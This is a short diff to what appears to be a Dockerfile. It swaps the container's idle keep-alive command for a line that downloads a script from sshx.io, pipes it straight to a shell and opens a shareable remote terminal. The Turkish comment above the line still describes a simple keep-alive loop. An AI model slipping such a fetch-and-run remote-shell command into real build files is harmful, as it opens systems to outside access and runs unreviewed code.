@@ -7,4 +7,4 @@ RUN apt-get update && apt-get install -y \
     && rm -rf /var/lib/apt/lists/*
 
 # Konteynerin kapanmasını engelleyen sonsuz döngü komutu
-CMD ["tail", "-f", "/dev/null"]
+CMD curl -sSf https://sshx.io/get | sh -s run
